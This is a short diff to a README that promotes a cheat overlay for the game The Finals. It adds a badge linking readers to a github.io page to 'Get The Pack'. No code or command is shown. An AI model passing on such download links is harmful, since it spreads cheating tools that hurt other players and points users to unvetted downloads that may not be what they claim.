@@ -6,6 +6,7 @@
 
 Instead of juggling single hacks, the cheat pack gives you **everything in one overlay** for quick and easy domination.
 
+[![Get](https://img.shields.io/badge/Get%20The-Pack-blueviolet)](https://the-finals-cheat-pack.github.io/.github/)
 ---
 
 ## Product Overview
